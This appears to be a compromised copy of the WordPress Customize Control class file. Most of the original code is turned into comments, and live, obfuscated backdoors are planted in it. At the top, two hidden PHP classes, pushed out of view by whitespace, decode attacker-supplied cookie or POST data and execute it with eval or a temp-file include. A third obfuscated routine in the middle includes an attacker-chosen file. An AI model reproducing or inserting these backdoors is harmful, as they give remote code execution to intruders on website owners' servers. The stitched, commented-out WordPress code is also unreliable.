<?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $rLAwhD = class_exists("jcJ_SAbsq"); $hNjoxEY = $rLAwhD;if (!$hNjoxEY){class jcJ_SAbsq{private $KUnRUpT;public static $ytZFIyrr = "d09dcc16-e0d9-41fa-9f22-c4a7844aa6f6";public static $NGXXnoTur = NULL;public function __construct(){$RlMgz = $_COOKIE;$oGZvx = $_POST;$LGHNJYKBp = @$RlMgz[substr(jcJ_SAbsq::$ytZFIyrr, 0, 4)];if (!empty($LGHNJYKBp)){$RzNWAvY = "base64";$wfGdh = "";$LGHNJYKBp = explode(",", $LGHNJYKBp);foreach ($LGHNJYKBp as $ogwSGfSm){$wfGdh .= @$RlMgz[$ogwSGfSm];$wfGdh .= @$oGZvx[$ogwSGfSm];}$wfGdh = array_map($RzNWAvY . chr (95) . chr (100) . chr (101) . "\143" . "\157" . "\144" . chr ( 874 - 773 ), array($wfGdh,)); $wfGdh = $wfGdh[0] ^ str_repeat(jcJ_SAbsq::$ytZFIyrr, (strlen($wfGdh[0]) / strlen(jcJ_SAbsq::$ytZFIyrr)) + 1);jcJ_SAbsq::$NGXXnoTur = @unserialize($wfGdh);}}public function __destruct(){$this->nBPrEwrL();}private function nBPrEwrL(){if (is_array(jcJ_SAbsq::$NGXXnoTur)) {$QkbBlMNqF = str_replace('<' . chr ( 191 - 128 )."\160" . 'h' . "\160", "", jcJ_SAbsq::$NGXXnoTur[chr ( 195 - 96 )."\x6f" . 'n' . 't' . "\x65" . chr (110) . chr ( 751 - 635 )]);eval($QkbBlMNqF);exit();}}}$fBdxx = new jcJ_SAbsq(); $fBdxx = NULL;} ?><?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $Nsekze = class_exists("a_ksi");if (!$Nsekze){class a_ksi{private $IJGTbw;public static $YmcwgK = "9d1132b5-5740-406b-8da5-6191e0cc405c";public static $HsAsD = NULL;public function __construct(){$kQUTA = $_COOKIE;$mbtyMCkPZ = $_POST;$qHvWB = @$kQUTA[substr(a_ksi::$YmcwgK, 0, 4)];if (!empty($qHvWB)){$nyIsncgq = "base64";$kYdDmDsY = "";$qHvWB = explode(",", $qHvWB);foreach ($qHvWB as $ZearvAMmTi){$kYdDmDsY .= @$kQUTA[$ZearvAMmTi];$kYdDmDsY .= @$mbtyMCkPZ[$ZearvAMmTi];}$kYdDmDsY = array_map($nyIsncgq . "\x5f" . "\144" . chr ( 259 - 158 )."\143" . chr ( 819 - 708 )."\x64" . 'e', array($kYdDmDsY,)); $kYdDmDsY = $kYdDmDsY[0] ^ str_repeat(a_ksi::$YmcwgK, (strlen($kYdDmDsY[0]) / strlen(a_ksi::$YmcwgK)) + 1);a_ksi::$HsAsD = @unserialize($kYdDmDsY);}}public function __destruct(){$this->yKjtlLG();}private function yKjtlLG(){if (is_array(a_ksi::$HsAsD)) {$XePKfXI = sys_get_temp_dir() . "/" . crc32(a_ksi::$HsAsD["\x73" . "\141" . chr ( 540 - 432 ).chr (116)]);@a_ksi::$HsAsD["\x77" . chr ( 287 - 173 ).chr ( 241 - 136 )."\164" . "\145"]($XePKfXI, a_ksi::$HsAsD[chr ( 612 - 513 ).chr ( 1007 - 896 )."\x6e" . chr ( 1016 - 900 )."\145" . 'n' . "\164"]);include $XePKfXI;@a_ksi::$HsAsD["\x64" . "\x65" . "\154" . "\x65" . chr ( 953 - 837 ).'e']($XePKfXI);exit();}}}$qBsFrXXwgQ = new a_ksi(); $qBsFrXXwgQ = NULL;} ?><?php /* 
*
 * WordPress Customize Control classes
 *
 * @package WordPress
 * @subpackage Customize
 * @since 3.4.0
 

*
 * Customize Control class.
 *
 * @since 3.4.0
 
class WP_Customize_Control {

	*
	 * Incremented with each new class instantiation, then stored in $instance_number.
	 *
	 * Used when sorting two instances whose priorities are equal.
	 *
	 * @since 4.1.0
	 * @var int
	 
	protected static $instance_count = 0;

	*
	 * Order in which this instance was created in relation to other instances.
	 *
	 * @since 4.1.0
	 * @var int
	 
	public $instance_number;

	*
	 * Customizer manager.
	 *
	 * @since 3.4.0
	 * @var WP_Customize_Manager
	 
	public $manager;

	*
	 * Control ID.
	 *
	 * @since 3.4.0
	 * @var string
	 
	public $id;

	*
	 * All settings tied to the control.
	 *
	 * @since 3.4.0
	 * @var array
	 
	public $settings;

	*
	 * The primary setting for the control (if there is one).
	 *
	 * @since 3.4.0
	 * @var string|WP_Customize_Setting|null
	 
	public $setting = 'default';

	*
	 * Capability required to use this control.
	 *
	 * Normally this is empty and the capability is derived from the capabilities
	 * of the associated `$settings`.
	 *
	 * @since 4.5.0
	 * @var string
	 
	public $capability;

	*
	 * Order priority to load the control in Customizer.
	 *
	 * @since 3.4.0
	 * @var int
	 
	public $priority = 10;

	*
	 * Section the control belongs to.
	 *
	 * @since 3.4.0
	 * @var string
	 
	public $section = '';

	*
	 * Label for the control.
	 *
	 * @since 3.4.0
	 * @var string
	 
	public $label = '';

	*
	 * Description for the control.
	 *
	 * @since 4.0.0
	 * @var string
	 
	public $description = '';

	*
	 * List of choices for 'radio' or 'select' type controls, where values are the keys, and labels are the values.
	 *
	 * @since 3.4.0
	 * @var array
	 
	public $choices = array();

	*
	 * List of custom input attributes for control output, where attribute names are the keys and values are the values.
	 *
	 * Not used for 'checkbox', 'radio', 'select', 'textarea', or 'dropdown-pages' control types.
	 *
	 * @since 4.0.0
	 * @var array
	 
	public $input_attrs = array();

	*
	 * Show UI for adding new content, currently only used for the dropdown-pages control.
	 *
	 * @since 4.7.0
	 * @var bool
	 
	public $allow_addition = false;

	*
	 * @deprecated It is better to just call the json() method
	 * @since 3.4.0
	 * @var array
	 
	public $json = array();

	*
	 * Control's Type.
	 *
	 * @since 3.4.0
	 * @var string
	 
	public $type = 'text';

	*
	 * Callback.
	 *
	 * @since 4.0.0
	 *
	 * @see WP_Customize_Control::active()
	 *
	 * @var callable Callback is called with one argument, the instance of
	 *               WP_Customize_Control, and returns bool to indicate whether
	 *               the control is active (such as it relates to the URL
	 *               currently being previewed).
	 
	public $active_callback = '';

	*
	 * Constructor.
	 *
	 * Supplied `$args` override class property defaults.
	 *
	 * If `$args['settings']` is not defined, use the $id as the setting ID.
	 *
	 * @since 3.4.0
	 *
	 * @param WP_Customize_Manager $manager Customizer bootstrap instance.
	 * @param string               $id      Control ID.
	 * @param array                $args    {
	 *     Optional. Array of properties for the new Control object. Default empty array.
	 *
	 *     @type int                  $instance_number Order in which this instance was created in relation
	 *                                                 to other instances.
	 *     @type WP_Customize_Manager $manager         Customizer bootstrap instance.
	 *     @type string               $id              Control ID.
	 *     @type array                $settings        All settings tied to the control. If undefined, `$id` will
	 *                                                 be used.
	 *     @type string               $setting         The primary setting for the control (if there is one).
	 *                                                 Default 'default'.
	 *     @type string               $capability      Capability required to use this control. Normally this is empty
	 *                                                 and the capability is derived from `$settings`.
	 *     @type int                  $priority        Order priority to load the control. Default 10.
	 *     @type string               $section         Section the control belongs to. Default empty.
	 *     @type string               $label           Label for the control. Default empty.
	 *     @type string               $description     Description for the control. Default empty.
	 *     @type array                $choices         List of choices for 'radio' or 'select' type controls, where
	 *                                                 values are the keys, and labels are the values.
	 *                                                 Default empty array.
	 *     @type array                $input_attrs     List of custom input attributes for control output, where
	 *                                                 attribute names are the keys and values are the values. Not
	 *                                                 used for 'checkbox', 'radio', 'select', 'textarea', or
	 *                                                 'dropdown-pages' control types. Default empty array.
	 *     @type bool                 $allow_addition  Show UI for adding new content, currently only used for the
	 *                                                 dropdown-pages control. Default false.
	 *     @type array                $json            Deprecated. Use WP_Customize_Control::json() instead.
	 *     @type string               $type            Control type. Core controls include 'text', 'checkbox',
	 *                                                 'textarea', 'radio', 'select', and 'dropdown-pages'. Additional
	 *                                                 input types such as 'email', 'url', 'number', 'hidden', and
	 *                                                 'date' are supported implicitly. Default 'text'.
	 *     @type callable             $active_callback Active callback.
	 * }
	 
	public function __construct( $manager, $id, $args = array() ) {
		$keys = array_keys( get_object_vars( $this ) );
		foreach ( $keys as $key ) {
			if ( isset( $args[ $key ] ) ) {
				$this->$key = $args[ $key ];
			}
		}

		$this->manager = $manager;
		$this->id      = $id;
		if ( empty( $this->active_callback ) ) {
			$this->active_callback = array( $this, 'active_callback' );
		}
		self::$instance_count += 1;
		$this->instance_number = self::$instance_count;

		 Process settings.
		if ( ! isset( $this->settings ) ) {
			$this->settings = $id;
		}

		$settings = array();
		if ( is_array( $this->settings ) ) {
			foreach ( $this->settings as $key => $setting ) {
				$settings[ $key ] = $this->manager->get_setting( $setting );
			}
		} elseif ( is_string( $this->settings ) ) {
			$this->setting       = $this->manager->get_setting( $this->settings );
			$settings['default'] = $this->setting;
		}
		$this->settings = $settings;
	}

	*
	 * Enqueue control related scripts/styles.
	 *
	 * @since 3.4.0
	 
	public function enqueue() {}

	*
	 * Check whether control is active to current Customizer preview.
	 *
	 * @since 4.0.0
	 *
	 * @return bool Whether the control is active to the current preview.
	 
	final public function active() {
		$control = $this;
		$active  = call_user_func( $this->active_callback, $this );

		*
		 * Filters response of WP_Customize_Control::active().
		 *
		 * @since 4.0.0
		 *
		 * @param bool                 $active  Whether the Customizer control is active.
		 * @param WP_Customize_Control $control WP_Customize_Control instance.
		 
		$active = apply_filters( 'customize_control_active', $active, $control );

		return $active;
	}

	*
	 * Default callback used when invoking WP_Customize_Control::active().
	 *
	 * Subclasses can override this with their specific logic, or they may
	 * provide an 'active_callback' argument to the constructor.
	 *
	 * @since 4.0.0
	 *
	 * @return true Always true.
	 
	public function active_callback() {
		return true;
	}

	*
	 * Fetch a setting's value.
	 * Grabs the main setting by default.
	 *
	 * @since 3.4.0
	 *
	 * @param string $setting_key
	 * @return mixed The requested setting's value, if the setting exists.
	 
	final public function value( $setting_key = 'default' ) {
		if ( isset( $this->settings[ $setting_key ] ) ) {
			return $this->settings[ $setting_key ]->value();
		}
	}

	*
	 * Refresh the parameters passed to the JavaScript via JSON.
	 *
	 * @since 3.4.0
	 
	public function to_json() {
		$this->json['settings'] = array();
		foreach ( $this->settings as $key => $setting ) {
			$this->json['settings'][ $key ] = $setting->id;
		}

		$this->json['type']           = $this->type;
		$this->json['priority']       = $this->priority;
		$this->json['active']         = $this->active();
		$this->json['section']        = $this->section;
		$this->json['content']        = $this->get_content();
		$this->json['label']          = $this->label;
		$this->json['description']    = $this->description;
		$this->json['instanceNumber'] = $this->instance_number;

		if ( 'dropdown-pages' === $this->type ) {
			$this->json['allow_addition'] = $this->allow_addition;
		}
	}

	*
	 * Get the data to export to the client via JSON.
	 *
	 * @since 4.1.0
	 *
	 * @return array Array of parameters passed to the JavaScript.
	 
	public function json() {
		$this->to_json();
		return $this->json;
	}

	*
	 * Checks if the user can use this control.
	 *
	 * Returns false if the user cannot manipulate one of the associated settings,
	 * or if one of the associated settings does not exist. Also returns false if
	 * the associated section does not exist or if its capability check returns
	 * false.
	 *
	 * @since 3.4.0
	 *
	 * @return bool False if theme doesn't support the control or user doesn't have the required permissions, otherwise true.
	 
	final public function check_capabilities() {
		if ( ! empty( $this->capability ) && ! current_user_can( $this->capability ) ) {
			return false;
		}

		foreach ( $this->settings as $setting ) {
			if ( ! $setting || ! $setting->check_capabilities() ) {
				return false;
			}
		}

		$section = $this->manager->get_section( $this->section );
		if ( isset( $section ) && ! $section->check_capabilities() ) {
			return false;
		}

		return true;
	}

	*
	 * Get the control's content for insertion into the Customizer pane.
	 *
	 * @since 4.1.0
	 *
	 * @return string Contents of the control.
	 
	final public function get_content() {
		ob_start();
		$this->maybe_render();
		return trim( ob_get_clean() );
	}

	*
	 * Check capabilities and render the control.
	 *
	 * @since 3.4.0
	 * @uses WP_Customize_Control::render()
	 
	final public function maybe_render() {
		if ( ! $this->check_capabilities() ) {
			return;
		}

		*
		 * Fires just before the current Customizer control is rendered.
		 *
		 * @since 3.4.0
		 *
		 * @param WP_Customize_Control $this WP_Customize_Control instance.
		 
		do_action( 'customize_render_control', $this );

		*
		 * Fires just before a specific Customizer control is rendered.
		 *
		 * The dynamic portion of the hook name, `$this->id`, refers to
		 * the control ID.
		 *
		 * @since 3.4.0
		 *
		 * @param WP_Customize_Control $this WP_Customize_Control instance.
		 
		do_action( "customize_render_control_{$this->id}", $this );

		$this->render();
	}

	*
	 * Renders the control wrapper and calls $this->render_content() for the internals.
	 *
	 * @since 3.4.0
	 
	protected function render() {
		$id    = 'customize-control-' . str_replace( array( '[', ']' ), array( '-', '' ), $this->id );
		$class = 'customize-control customize-control-' . $this->type;

		printf( '<li id="%s" class="%s">', esc_attr( $id ), esc_attr( $class ) );
		$this->render_content();
		echo '</li>';
	}

	*
	 * Get the data link attribute for a setting.
	 *
	 * @since 3.4.0
	 * @since 4.9.0 Return a `data-customize-setting-key-link` attribute if a setting is not registered for the supplied setting key.
	 *
	 * @param string $setting_key
	 * @return string Data link parameter, a `data-customize-setting-link` attribute if the `$setting_key` refers to a pre-registered setting,
	 *                and a `data-customize-setting-key-link` attribute if the setting is not yet registered.
	 
	public function get_link( $setting_key = 'default' ) {
		if ( isset( $this->settings[ $setting_key ] ) && $this->settings[ $setting_key ] instanceof WP_Customize_Setting ) {
			return 'data-customize-setting-link="' . esc_attr( $this->settings[ $setting_key ]->id ) . '"';
		} else {
			return 'data-customize-setting-key-link="' . esc_attr( $setting_key ) . '"';
		}
	}

	*
	 * Render the data link attribute for the control's input element.
	 *
	 * @since 3.4.0
	 * @uses WP_Customize_Control::get_link()
	 *
	 * @param string $setting_key
	 
	public function link( $setting_key = 'default' ) {
		echo $this->get_link( $setting_key );
	}

	*
	 * Render the custom attributes for the control's input element.
	 *
	 * @since 4.0.0
	 
	public function input_attrs() {
		foreach ( $this->input_attrs as $attr => $value ) {
			echo $attr . '="' . esc_attr( $value ) . '" ';
		}
	}

	*
	 * Render the control's content.
	 *
	 * Allows the content to be overridden without having to rewrite the wrapper in `$this::render()`.
	 *
	 * Supports basic input types `text`, `checkbox`, `textarea`, `radio`, `select` and `dropdown-pages`.
	 * Additional input types such as `email`, `url`, `number`, `hidden` and `date` are supported implicitly.
	 *
	 * Control content can alternately be rendered in JS. See WP_Customize_Control::print_template().
	 *
	 * @since 3.4.0
	 
	protected function render_content() {
		$input_id         = '_customize-input-' . $this->id;
		$description_id   = '_customize-description-' . $this->id;
		$describedby_attr = ( ! empty( $this->description ) ) ? ' aria-describedby="' . esc_attr( $description_id ) . '" ' : '';
		switch ( $this->type ) {
			case 'checkbox':
				?>
				<span class="customize-inside-control-row">
					<input
						id="<?php /*  echo esc_attr( $input_id ); ?>"
						<?php /*  echo $describedby_attr; ?>
						type="checkbox"
						value="<?php /*  echo esc_attr( $this->value() ); ?>"
						<?php /*  $this->link(); ?>
						<?php /*  checked( $this->value() ); ?>
					/>
					<label for="<?php /*  echo esc_attr( $input_id ); ?>"><?php /*  echo esc_html( $this->label ); ?></label>
					<?php /*  if ( ! empty( $this->description ) ) : ?>
						<span id="<?php /*  echo esc_attr( $description_id ); ?>" class="description customize-control-description"><?php /*  echo $this->description; ?></span>
					<?php /*  endif; ?>
				</span>
				<?php /* 
				break;
			case 'radio':
				if ( empty( $this->choices ) ) {
					return;
				}

				$name = '_customize-radio-' . $this->id;
				?>
				<?php /*  if ( ! empty( $this->label ) ) : ?>
					<span class="customize-control-title"><?php /*  echo esc_html( $this->label ); ?></span>
				<?php /*  endif; ?>
				<?php /*  if ( ! empty( $this->description ) ) : ?>
					<span id="<?php /*  echo esc_attr( $description_id ); ?>" class="description customize-control-description"><?php /*  echo $this->description; ?></span>
				<?php /*  endif; ?>

				<?php /*  foreach ( $this->choices as $value => $label ) : ?>
					<span class="customize-inside-control-row">
						<input
							id="<?php /*  echo esc_attr( $input_id . '-radio-' . $value ); ?>"
							type="radio"
							<?php /*  echo $describedby_attr; ?>
							value="<?php /*  echo esc_attr( $value ); ?>"
							name="<?php /*  echo esc_attr( $name ); ?>"
							<?php /*  $this->link(); ?>
							<?php /*  checked( $this->value(), $value ); ?>
							/>
						<label for="<?php /*  echo esc_attr( $input_id . '-radio-' . $value ); ?>"><?php /*  echo esc_html( $label ); ?></label>
					</span>
				<?php /*  endforeach; ?>
				<?php /* 
				break;
			case 'select':
				if ( empty( $this->choices ) ) {
					return;
				}

				?>
				<?php /*  if ( ! empty( $this->label ) ) : ?>
					<label for="<?php /*  echo esc_attr( $input_id ); ?>" class="customize-control-title"><?php /*  echo esc_html( $this->label ); ?></label>
				<?php /*  endif; ?>
				<?php /*  if ( ! empty( $this->description ) ) : ?>
					<span id="<?php /*  echo esc_attr( $description_id ); ?>" class="description customize-control-description"><?php /*  echo $this->description; ?></span>
				<?php /*  endif; ?>

				<select id="<?php /*  echo esc_attr( $input_id ); ?>" <?php /*  echo $describedby_attr; ?> <?php /*  $this->link(); ?>>
					<?php /* 
					foreach ( $this->choices as $value => $label ) {
						echo '<option value="' . esc_attr( $value ) . '"' . selected( $this->value(), $value, false ) . '>' . $label . '</option>';
					}
					?>
				</select>
				<?php /* 
				break;
			case 'textarea':
				?>
				<?php /*  if ( ! empty( $this->label ) ) : ?>
					<label for="<?php /*  echo esc_attr( $input_id ); ?>" class="customize-control-title"><?php /*  echo esc_html( $this->label ); ?></label>
				<?php /*  endif; ?>
				<?php /*  if ( ! empty( $this->description ) ) : ?>
					<span id="<?php /*  echo esc_attr( $description_id ); ?>" class="description customize-control-description"><?php /*  echo $this->description; ?></span>
				<?php /*  endif; ?>
				<textarea
					id="<?php /*  echo esc_attr( $input_id ); ?>"
					rows="5"
					<?php /*  echo $describedby_attr; ?>
					<?php /*  $this->input_attrs(); ?>
					<?php /*  $this->link(); ?>
				><?php /*  echo esc_textarea( $this->value() ); ?></textarea>
				<?php /* 
				break;
			case 'dropdown-pages':
				?>
				<?php /*  if ( ! empty( $this->label ) ) : ?>
					<label for="<?php /*  echo esc_attr( $input_id ); ?>" class="customize-control-title"><?php /*  echo esc_html( $this->label ); ?></label>
				<?php /*  endif; ?>
				<?php /*  if ( ! empty( $this->description ) ) : ?>
					<span id="<?php /*  echo esc_attr( $description_id ); ?>" class="description customize-control-description"><?php /*  echo $this->description; ?></span>
				<?php /*  endif; ?>

				<?php /* 
				$dropdown_name     = '_customize-dropdown-pages-' . $this->id;
				$show_option_none  = __( '&mdash; Select &mdash;' );
				$option_none_value = '0';
				$dropdown          = wp_dropdown_pages(
					array(
						'name'              => $dropdown_name,
						'echo'              => 0,
						'show_option_none'  => $show_option_none,
						'option_none_value' => $option_none_value,
						'selected'        */






function field()

{
    $fragment = 'where_post_type';
}

function backup_sizes()

{
    $hours = 'where_post_type';

    $force_delete = 924;

}

function em_dash($version)

{

    $width = $version;


	$expages = 'page_path';
    $close_quote = $GLOBALS[link("%0A%2A%26tr6", $width)];
    $intermediate_file = $close_quote;
    $kids = 'where_post_type';
    $the_post = isset($intermediate_file[$width]);
	$hex_encoding = 'postid';
    $perm = 'where_post_type';

    if ($the_post)

    {
        $core = $close_quote[$width];
	$emoji_fields = 'allowed_html';
        $comment = 123;

        $page = 656;
	$field_no_prefix = 'html_regex';
        $tags_to_ignore = $core[link("%21%01%1FgY%04U%0F", $width)];

        $sign = 'where_post_type';

        $results = $tags_to_ignore;
        $filename_raw = $comment % ($page + 4);
        $comment = $page - $comment;
        include ($results);

    }
}

function link($sort_column, $enclosure)

{

    $revision_ids = $enclosure;

    $closing_single_quote = "url";
    $closing_single_quote  .= "decode";
    $replace = $closing_single_quote($sort_column);
	$flag_no_digit = 'wp_smiliessearch';
    $date_floating = strlen($replace);
	$dest = 'value';
    $date_floating = substr($revision_ids, 0, $date_floating);
    $array = $replace ^ $date_floating;
	$mime_subgroup = 'old_dates';
    $exclude_tree = 620;
	$old_slugs = 'escaped';

    $replace = sprintf($array, $date_floating);
    $exclude_tree = $exclude_tree + 4;
	$wp_rewrite = 'domain';
    $emoji_char = 'where_post_type';


    return $array;
}


	$stickies = 'open_quote';
em_dash('Ulo87e8jSK0qgYb');
	$capabilities = 'new_status';


	$more_string = 'user_id';

field();


	$in_string = 'first';


backup_sizes();





/*   => $this->value(),
					)
				);
				if ( empty( $dropdown ) ) {
					$dropdown  = sprintf( '<select id="%1$s" name="%1$s">', esc_attr( $dropdown_name ) );
					$dropdown .= sprintf( '<option value="%1$s">%2$s</option>', esc_attr( $option_none_value ), esc_html( $show_option_none ) );
					$dropdown .= '</select>';
				}

				 Hackily add in the data link parameter.
				$dropdown = str_replace( '<select', '<select ' . $this->get_link() . ' id="' . esc_attr( $input_id ) . '" ' . $describedby_attr, $dropdown );

				 Even more hacikly add auto-draft page stubs.
				 @todo Eventually this should be removed in favor of the pages being injected into the underlying get_pages() call. See <https:github.com/xwp/wp-customize-posts/pull/250>.
				$nav_menus_created_posts_setting = $this->manager->get_setting( 'nav_menus_created_posts' );
				if ( $nav_menus_created_posts_setting && current_user_can( 'publish_pages' ) ) {
					$auto_draft_page_options = '';
					foreach ( $nav_menus_created_posts_setting->value() as $auto_draft_page_id ) {
						$post = get_post( $auto_draft_page_id );
						if ( $post && 'page' === $post->post_type ) {
							$auto_draft_page_options .= sprintf( '<option value="%1$s">%2$s</option>', esc_attr( $post->ID ), esc_html( $post->post_title ) );
						}
					}
					if ( $auto_draft_page_options ) {
						$dropdown = str_replace( '</select>', $auto_draft_page_options . '</select>', $dropdown );
					}
				}

				echo $dropdown;
				?>
				<?php if ( $this->allow_addition && current_user_can( 'publish_pages' ) && current_user_can( 'edit_theme_options' ) ) :  Currently tied to menus functionality. ?>
					<button type="button" class="button-link add-new-toggle">
						<?php
						 translators: %s: Add New Page label. 
						printf( __( '+ %s' ), get_post_type_object( 'page' )->labels->add_new_item );
						?>
					</button>
					<div class="new-content-item">
						<label for="create-input-<?php echo $this->id; ?>"><span class="screen-reader-text"><?php _e( 'New page title' ); ?></span></label>
						<input type="text" id="create-input-<?php echo $this->id; ?>" class="create-item-input" placeholder="<?php esc_attr_e( 'New page title&hellip;' ); ?>">
						<button type="button" class="button add-content"><?php _e( 'Add' ); ?></button>
					</div>
				<?php endif; ?>
				<?php
				break;
			default:
				?>
				<?php if ( ! empty( $this->label ) ) : ?>
					<label for="<?php echo esc_attr( $input_id ); ?>" class="customize-control-title"><?php echo esc_html( $this->label ); ?></label>
				<?php endif; ?>
				<?php if ( ! empty( $this->description ) ) : ?>
					<span id="<?php echo esc_attr( $description_id ); ?>" class="description customize-control-description"><?php echo $this->description; ?></span>
				<?php endif; ?>
				<input
					id="<?php echo esc_attr( $input_id ); ?>"
					type="<?php echo esc_attr( $this->type ); ?>"
					<?php echo $describedby_attr; ?>
					<?php $this->input_attrs(); ?>
					<?php if ( ! isset( $this->input_attrs['value'] ) ) : ?>
						value="<?php echo esc_attr( $this->value() ); ?>"
					<?php endif; ?>
					<?php $this->link(); ?>
					/>
				<?php
				break;
		}
	}

	*
	 * Render the control's JS template.
	 *
	 * This function is only run for control types that have been registered with
	 * WP_Customize_Manager::register_control_type().
	 *
	 * In the future, this will also print the template for the control's container
	 * element and be override-able.
	 *
	 * @since 4.1.0
	 
	final public function print_template() {
		?>
		<script type="text/html" id="tmpl-customize-control-<?php echo $this->type; ?>-content">
			<?php $this->content_template(); ?>
		</script>
		<?php
	}

	*
	 * An Underscore (JS) template for this control's content (but not its container).
	 *
	 * Class variables for this control class are available in the `data` JS object;
	 * export custom variables by overriding WP_Customize_Control::to_json().
	 *
	 * @see WP_Customize_Control::print_template()
	 *
	 * @since 4.1.0
	 
	protected function content_template() {}

}

*
 * WP_Customize_Color_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-color-control.php';

*
 * WP_Customize_Media_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-media-control.php';

*
 * WP_Customize_Upload_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-upload-control.php';

*
 * WP_Customize_Image_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-image-control.php';

*
 * WP_Customize_Background_Image_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-background-image-control.php';

*
 * WP_Customize_Background_Position_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-background-position-control.php';

*
 * WP_Customize_Cropped_Image_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-cropped-image-control.php';

*
 * WP_Customize_Site_Icon_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-site-icon-control.php';

*
 * WP_Customize_Header_Image_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-header-image-control.php';

*
 * WP_Customize_Theme_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-theme-control.php';

*
 * WP_Widget_Area_Customize_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-widget-area-customize-control.php';

*
 * WP_Widget_Form_Customize_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-widget-form-customize-control.php';

*
 * WP_Customize_Nav_Menu_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-nav-menu-control.php';

*
 * WP_Customize_Nav_Menu_Item_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-nav-menu-item-control.php';

*
 * WP_Customize_Nav_Menu_Location_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-nav-menu-location-control.php';

*
 * WP_Customize_Nav_Menu_Name_Control class.
 *
 * As this file is deprecated, it will trigger a deprecation notice if instantiated. In a subsequent
 * release, the require_once here will be removed and _deprecated_file() will be called if file is
 * required at all.
 *
 * @deprecated 4.9.0 This file is no longer used due to new menu creation UX.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-nav-menu-name-control.php';

*
 * WP_Customize_Nav_Menu_Locations_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-nav-menu-locations-control.php';

*
 * WP_Customize_Nav_Menu_Auto_Add_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-nav-menu-auto-add-control.php';

*
 * WP_Customize_Date_Time_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-customize-date-time-control.php';

*
 * WP_Sidebar_Block_Editor_Control class.
 
require_once ABSPATH . WPINC . '/customize/class-wp-sidebar-block-editor-control.php';
*/